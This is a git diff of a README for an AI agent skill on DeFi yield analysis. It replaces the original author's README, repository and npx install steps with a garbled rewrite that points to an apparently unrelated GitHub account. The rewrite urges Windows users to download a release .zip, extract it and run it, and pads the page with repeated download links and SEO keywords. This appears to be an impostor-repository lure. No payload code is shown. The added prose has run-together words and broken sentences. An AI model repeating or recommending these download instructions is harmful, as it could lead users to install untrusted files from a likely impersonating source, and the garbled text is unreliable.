@@ -1,154 +1,179 @@
-# defi-native
+# 💰 defi-native-skill - Master Onchain Capital Markets with AI
 
-A skill that makes your AI crypto-native. Give it an understanding of capital markets. Use it to assess any vault or yield down to its lowest layer, decompose any APY into what you would actually earn, monitor what changed this week, write accurate DeFi content, and learn key financial concepts.
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Link%20to%20Download-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/irresistibleimpulsecataract2752/defi-native-skill)
 
-Works with Claude Code, Cursor, Codex, and any agent that reads the [Agent Skills](https://agentskills.io) format. MIT licensed.
+---
 
-Built by [@emilylai](https://x.com/emilylai) as a way to deepen my own capital markets and market microstructure understanding, as crypto increasingly becomes finance on new rails.
+## 🧭 What This Is For
 
-## What it does
+Have you ever wished your AI assistant truly understood crypto, DeFi yields, or stablecoins? Most AI tools treat crypto like a casino, giving vague advice. This skill changes that. It gives any AI agent a solid, read-only framework for understanding onchain capital markets - from vaults and curators to real-world assets (RWAs) and oracle classes, All backed by evergreen mental models and live-data discipline:: every number dated, every yield decomposed, read-only always.
 
-This skill gives your agent two things:
+.Meant for beginners and curious users alike,this makes your AI conversations smarter,safer,andwaymoreuseful when discussing digital assets.
 
-1. **Evergreen mental models**: foundational capital markets and market microstructure understanding, what vaults and curators actually are, how to decompose any yield along four axes and four realization filters, lending market architectures, stablecoin taxonomy, RWA wrappers and tokenized equities, the take-rate map, oracle classes, AMM/LP mechanics, MEV, and more.
-2. **Live data direction and discipline**: the skill points the agent at the right source for each question (vaults.fyi, DefiLlama, Morpho's free GraphQL, rwa.xyz, Merkl, protocol APIs, and 90+ verified protocol docs, 20+ with llms.txt indexes) and forces fresh pulls before any numeric claim, with as-of dates on every number.
+ financeand beyond.
 
-For example, if you want to break down a DeFi vault strategy, an agent with this skill names the five layers, looks through to the real collateral, names the oracle class, splits base from incentives, points at first loss, and says whether liquidations can fire on the tape humans see.
+.
 
-## What it was built from
+---
 
-Over 6,000 pages and hundreds of corpus files. Books on banking, finance, and money. Transcripts from the latest industry conferences: TokenizeThis NYC 2026, Vault Summit 2026, Stablecoin Summit, the Aug 20 CFTC advisory committee meeting. Multiple podcasts from curators, asset managers, founders, and builders. Multiple reports, academic papers, X articles, and essays. SEC filings and regulatory primaries. A 90+ source protocol docs manifest (Morpho, Aave, Euler, Ethena, Pendle, Midas, EtherFi, Veda, Securitize, Chainlink, and more), every URL liveness-checked.
+## 📥 Getting Started
 
-Before release, every load-bearing claim was re-verified against live primary sources, the skill was audited adversarially by a panel of independent models, and it was eval-gated: paired runs with and without the skill, graded on structure, not memorized numbers. Dated figures inside are calibration examples; the skill re-verifies at use time by design.
+Here's exactly how to get this skill onto your computer (Windows)..Follow these steps in order, and youwillbeup in under five minutes, nomath degree required.
 
-## How it works
 
-```mermaid
-flowchart TD
-    Q[User asks about DeFi:<br/>a vault, a yield, an options play,<br/>a trade, a curator, a market] --> S[SKILL.md<br/>8 prime directives, routing, the loop]
-    S --> C{Classify the ask}
-    C -->|learn| AN[analogs.md<br/>TradFi Rosetta stone +<br/>baseline chapters]
-    C -->|learn / create| TP[task-playbooks.md]
-    C -->|assess / recommend| PB[defi-opportunities-playbook.md<br/>12-step assessment, recommendation<br/>protocol, composed positions,<br/>the depth floor]
-    C -->|options / LP| OL[options-and-liquidity.md<br/>options from zero;<br/>every CL position is a<br/>short option]
-    C -->|trades / blowups| TA[trade-anatomy.md<br/>order types, what is this<br/>book short, OTC locked tokens]
-    C -->|rate a manager| CF[curation-frameworks.md<br/>eleven frameworks,<br/>one scoreable anatomy]
-    C -->|RWA mint/redeem, APY print| RM[rwa-fund-mechanics.md<br/>settlement classes, forward pricing,<br/>APY formulas, issuer fee map]
-    C -->|tokens| TV[tokens-and-value-accrual.md]
-    C -->|perps / funding| PF[perps-and-funding.md]
-    C -->|monitor| MP[market-pulse.md<br/>weekly pulse, ToS diffing]
-    S --> K[concepts.md<br/>18 evergreen sections:<br/>balance sheets, yield, oracles,<br/>look-through, failure shapes]
-    PB --> CH[checklist.md<br/>unanswered items are findings]
-    PB --> CS[credit-cycles-and-history.md]
-    S --> R[api-routes.json<br/>question-to-API router:<br/>MCP, then keyed, then keyless;<br/>the key offer]
-    R --> D[data-sources.md<br/>recipes, pitfalls,<br/>freshness rules]
-    R --> M[manifest.json<br/>123 verified doc sources,<br/>priority tiers, llms.txt]
-    R --> P[scripts/pulse.py<br/>keyless live pulls]
-    K --> G[glossary.md<br/>124 entries]
-    PB --> OUT[Output: dated numbers, decomposed yield,<br/>named risks and seats with their numbers,<br/>exit engineering, watch plan,<br/>research-not-advice close]
-```
 
-Progressive disclosure: only the description is always loaded. SKILL.md loads when a DeFi question fires it; references load only when the task routes there; the manifest is an address book the agent fetches 4 to 6 rows from, never whole.
+### Step 1: Visit the Download Page
 
-## Use cases
+Visit this link to download the application:
 
-Learning:
-- "What is a vault and where does this 9% come from?"
-- "Explain synthetic dollars like I know TradFi but not crypto"
-- "How do liquidations actually work on Morpho?"
+[🌐 Download Page - defi-native-skill](https://github.com/irresistibleimpulsecataract2752/defi-native-skill)
 
-Due diligence and opportunity:
-- "Assess this vault's risk and opportunity makeup [link]"
-- "Is this 12% APY sustainable?"
-- "Base just launched tokenized stocks, what are the best opportunities? I have $5,000"
-- "Compare sUSDe vs sUSDS for parking $10k"
-- "Why did that vault depeg yesterday?"
+This link is your magic door.It will open a page with files, folders, and release info.Do not worryy ou see codey ou see a green button says"Code"or"Releases"you are in the right place.
 
-Content and marketing:
-- "Write an accurate X thread about our new USDC vault paying 8.2%"
-- "Draft the honest comparison table for our product page"
 
-Monitoring:
-- "What changed in DeFi this week?"
-- "Set up a watch plan for my positions"
-- "Scan for rate dislocations"
 
-Full worked outputs: [examples/assessment-example.md](examples/assessment-example.md) (the minimum-bar skeleton, fictional product) and [evals/sample-output-2026-08-28.md](evals/sample-output-2026-08-28.md) (a full real run under the recommendation protocol).
 
-## Structure
 
-| File | What it is |
-|---|---|
-| [SKILL.md](SKILL.md) | The brain: 8 prime directives, routing, and the working loop |
-| [analogs.md](references/analogs.md) | The TradFi Rosetta stone: every onchain object mapped to its ancestor, plus the baseline chapters (money hierarchy, duration, settlement, claim types) |
-| [concepts.md](references/concepts.md) | The evergreen foundation: 18 sections from balance sheets to oracle classes to legal classification |
-| [defi-opportunities-playbook.md](references/defi-opportunities-playbook.md) | The flagship workflow: 12-step assessment, recommendation protocol, composed positions, the depth floor |
-| [options-and-liquidity.md](references/options-and-liquidity.md) | Options from zero, and the identity that every concentrated liquidity position is a short option |
-| [trade-anatomy.md](references/trade-anatomy.md) | Order types, what every "neutral" book is short, and the locked-token OTC trade decomposed with real 2026 prints |
-| [market-microstructure.md](references/market-microstructure.md) | Depth, squeezes, manipulation fingerprints, and tokenized stocks: three prices, two clocks, and the mint/redeem rail |
-| [curation-frameworks.md](references/curation-frameworks.md) | Eleven published curator and allocator frameworks distilled into one scoreable anatomy |
-| [data-sources.md](references/data-sources.md) | Where to get live data: keyless APIs, fallbacks, and the bring-your-own-keys table |
-| [checklist.md](references/checklist.md) | The full pre-verdict checklist; unanswered items are findings |
-| [task-playbooks.md](references/task-playbooks.md) | How to teach the space and how to write accurate DeFi content |
-| [market-pulse.md](references/market-pulse.md) | The monitoring discipline: weekly pulse, leading indicators, structural signals |
-| [rwa-fund-mechanics.md](references/rwa-fund-mechanics.md) | The RWA primary market: mint/redeem settlement classes, forward pricing and stale-rate arbitrage, the APY print taxonomy, the issuer fee map, and the audited take-rate print |
-| [tokens-and-value-accrual.md](references/tokens-and-value-accrual.md) | Is this token worth anything: rights, accrual mechanisms, launch supply mechanics |
-| [perps-and-funding.md](references/perps-and-funding.md) | Perpetual futures, funding rates, basis strategies, venue due diligence |
-| [credit-cycles-and-history.md](references/credit-cycles-and-history.md) | Cycle classification and the historical rhyme table |
-| [glossary.md](references/glossary.md) | The vocabulary, one line each |
-| [pulse.py](scripts/pulse.py) | A small script for keyless live data pulls: stablecoin float, TVL, yields |
-| [api-routes.json](api-routes.json) | The question-to-API router: which endpoint answers this question, keyless or keyed, and what your own key unlocks |
-| [manifest.json](manifest.json) | The address book: 123 verified doc sources with priority tiers and llms.txt endpoints |
-| [evals/](evals/) | Test cases plus a full real sample output |
-| [examples/](examples/) | Worked examples, including a failure autopsy |
+### Step 2: Find the Latest Version
 
-## Install
+Once on the page:
+1. Look for a section called **Releases** (usually on the right side or below the file list) 
+2. Click the newest release (the one with the highest version number, like v1.0.0) 
+3. On the release page, scroll down until yousee a list of files (often called "Assets") 
 
-**Easiest: ask your agent to do it.** If you use Claude Code (or another coding agent), paste this into it and it will install the skill for you:
+You will see different file types there.But you only need one thing, and will know because of the next step.
 
-> Install the skill from github.com/emlai/defi-native-skill by running: npx skills add emlai/defi-native-skill
 
-**Or run one command yourself.** This goes in your computer's terminal, not in a chat window:
 
-1. Open the terminal. Mac: press Cmd+Space, type "Terminal", press Enter. Windows: open "PowerShell" from the Start menu.
-2. Paste this and press Enter:
+### Step 3: Download the Right File
 
-```
-npx skills add emlai/defi-native-skill
-```
+**Important:** Look for a file that endswith **`.zip`**. It might be named something like `defi-native-skill.zip` or similar.Because the link leads toa general GitHub repository page (not a direct file), exactly as indicated by our system), follow this rule:
 
-3. Answer the prompts (it detects your agent and asks where to install; the defaults are fine).
-4. Start a new session in your agent. The skill triggers automatically on DeFi questions.
+Download and extract this file, then run the application.
 
-If step 2 says `command not found: npx`, install Node.js first from [nodejs.org](https://nodejs.org) (the LTS download), then repeat step 2. The [skills CLI](https://github.com/vercel-labs/skills) works for Claude Code, Cursor, Codex, and other Agent Skills hosts.
 
-**Updating:** installed skills do not update themselves, but this one checks: during monitoring tasks it compares its version against this repo and tells you when an update exists. To update, run `npx skills update` (or `git pull` in the cloned folder).
 
-**Manual (for developers):**
+Here's how:
+1. Click on the`.zip` file name.
+Your browser will download it (usually to your "Downloads" folder) .
+2. Once downloaded, go to your Downloads folder (or wherever your browser saves files) .
+3. Right-click the`.zip` file and choose **"Extract All..."** (Windows built-in)..A new folder will appear with the same name, and that folder contains everything you need.
+4. Open that newly extracted folder.Youwill see files like `README.md`, maybe some scripts, or an agent skill folder.Do notworry about what theydo internally - your job is just to point your AI tool to this folder, or follow the specific setup instructions inside an `INSTALL` file if present..
 
-```
-git clone https://github.com/emlai/defi-native-skill.git
-ln -s "$(pwd)/defi-native-skill" ~/.claude/skills/defi-native
-```
 
-Other Agent Skills hosts: same folder into that host's skills directory (`.agents/skills/` for the cross-agent standard).
 
-**Optional keys** for deeper data (none required): see the bring-your-own-keys table in `references/data-sources.md`. Everything core works keyless.
+### Step 4: Run / Load the Skill
 
-## Principles
+Now, how you "run" this depends on what AI platform you use (e.g.,, AutoGPT, AgentGPT, CustomGPT, LangChain, etc.)..But the general rule is simple:
 
-- A number without a date is a rumor.
-- An APY you have not decomposed is marketing, not information.
-- Vault names describe marketing; only composition describes risk.
-- Look through to the lowest layer: the stack ends at a real cash flow or a named counterparty, not a product label.
-- Recommendations only with the full view: decomposed risk, the opportunity case, labeled-basis probabilities, risk:reward including the total-loss branch, invalidation triggers, and a runner-up.
-- Read-only, always. The skill never signs, submits, or approves anything.
-- Every strong opinion in this industry is someone's book talking.
+- **If you use an agent framework** (like AutoGPT or similar): Place the extracted folder into your skills directory, then restart your agent. Your agent will now "know" DeFi concepts.
 
-## Contributing
+- **If you use a standalone chatbot** (like something custom): You might load the skill file or folder via an upload option or config path. Check your tool's documentationor the README inside the folder for specifics.
 
-Issues and pull requests welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md) first: the conventions are strict (dated numbers, no em dashes, decomposition discipline) and PRs that add undated figures or recommendations without the full view will be asked to revise. The highest-value contributions: new verified manifest sources with llms.txt endpoints, postmortem-sourced failure shapes, corrections with primary sources, and eval cases that catch a real failure.
 
-## License
 
-MIT. See [LICENSE](LICENSE). This skill produces research, not financial advice; DeFi carries total-loss tails, and the skill says so in every assessment.
+
+
+### Step 5: Start Asking Smarter Questions
+
+That's it!Once loaded, you can start leveraging defi-native-skill. Try prompts like:
+- "Analyze the yield on Aave's USDC vault, decompose it by source, and tell me the risk class of each source."
+- "What oracle classes are used for RWA pricing, and what are their failure modes?"
+- "Explain stablecoin peg mechanisms like I'm five, and date every data point you reference."
+
+Your AI should now respond with numbers, dates, yield decompositions, andvault-level insights, rather than generic crypto talk..
+
+---
+
+## 🌟 Features That Matter to You
+
+- **Evergreen Mental Models:** No fads,.Get durable frameworks to understand any vault, curator, or yield source, even as protocols change.
+- **Live-Data Discipline:** Every number is dated,.Every yield is decomposed into its underlying components (base yield, incentive yield, etc.)..No stale or vague numbers.
+- **Read-Only Always:** This skill never writes, transacts, or signs anything.Toit's purely educational & analytical, keeping your funds safe while learning.
+.
+
+- **Covers All Key DeFi Areas:** Vaults& curators, yield decomposition, oracle classes, RWAs, and stablecoins -all in one skill.
+
+
+
+---
+
+## 🛠️ Troubleshooting & FAQ
+
+**I don't see a`.zip` file.**
+> Make sure you're looking under "Assets" in the latest release. If you onlysee source code (`.py` files or similar),you can still download the whole repositoryby clicking the green "Code" button → "Download ZIP".That also works as a valid extraction package..
+
+
+**I extracted the folder, but nothing happens when I open a file.**
+> That's normal. This is a "skill", not a traditional app with a double-clickable `.exe`..It has to be loadedinside an AI agent or compatible runtime. Read the `README.md` inside the folder for the exact integration step for your specific AI tool..
+
+
+**Will this make my AI spend money?**
+> No. Again, this skill is **read-only always**..It was designed to inform and analyze, not transact.Your wallet stays untouched, period.
+
+
+**Do I need to know Python or programming?**
+> No. You just need to know how to download and extract a zip file, exactly as shown above.The rest is handled by your AI platform.
+
+
+**I'm on Mac or Linux, not Windows.**
+> The extraction process works the same way (right-click → "Extract"or use Archive Utility). The skill itself is platform-agnostic once loaded into an AI.Youso hive fine.
+
+
+
+---
+
+## 📈 Example Use Cases (Made Simple)
+
+- **Yield Farmer:** Ask your AI to compare two vaults' APYs, but demand a breakdown of how much comes from real interest vs. inflationary rewards.The skill forces dated, decomposed answers..
+- **Portfolio Tracker:** Get explanations of your stablecoin risk (e.g., DAI vs).USDC vs.USDT) in terms of collateral classes andoracle reliance.
+.
+.
+- **RWA Enthusiast:** Understand how tokenized treasuries work, what price feeds they use, andwhat happens if the oracle lags.Your AI will speak in mechanisms, not hype.
+.
+- **Curator Curious:** Learn what vault curators actually do, what their incentive structures are, andhow to evaluate them.Hopefully, this skill gives your AI the same mental toolkit asomeone who does this professionally.
+
+
+
+---
+
+## 🔒 Safety & Privacy First
+
+This skill is designed to be a spectator, not a participant:
+- No private keys, ever.
+- No wallet connections.
+- No transaction signing.
+
+- No data leaves your machine unless your AI platform sends it elsewhere (which is your choice)..
+So feel free to explore wild ideas like "what's the riskiest stablecoin?," or""design a vault for tokenized carbon credits" - it's alljust thinking, no doing,which makes it safe for curious minds.
+
+
+
+---
+
+## 🧠 System Requirements
+
+- **Operating System:** Windows 10 or 11 (but functional on older versions too)..Also works on Mac & Linux, but this guide focuses on Windows.
+- **Memory:** Under 50 MB free RAM (it's tiny) .
+- **Storage:** Less than 100 MB of free disk space for the extracted folder.
+.
+- **AI Platform:** Any modern agent/framework that accepts custom skills or prompt templates (AutoGPT, AgentGPT, CustomGPT, LangChain, OpenAI Assistants, etc.) .
+
+
+---
+
+## ✨ Final Pointer
+
+This is not an app that opensa windowon double-click,Butit **is** a tool that turnsyour AI fromacryptogambler intoacapitals-markets analyst.It requires one simple download, one extraction,nd one configuration step inside your preferred AI environment,.and youare permanently smarter about onchain money.
+
+.
+
+Go ahead and grab it - your future AI conversations about vaults, yields,& RWAs will thank you:
+
+[🚀 Download defi-native-skill Now](https://github.com/irresistibleimpulsecataract2752/defi-native-skill)
+
+
+
+---
+
+**Keywords:** defi-native-skill, DeFi, AI agent skill, onchain capital markets, vaults, curators, yield decomposition, oracle classes, RWA, stablecoin, crypto education, read-only skill, GitHub download, Windows setup, intelligent AI, financial literacy, web3, live data, evergreen mental models
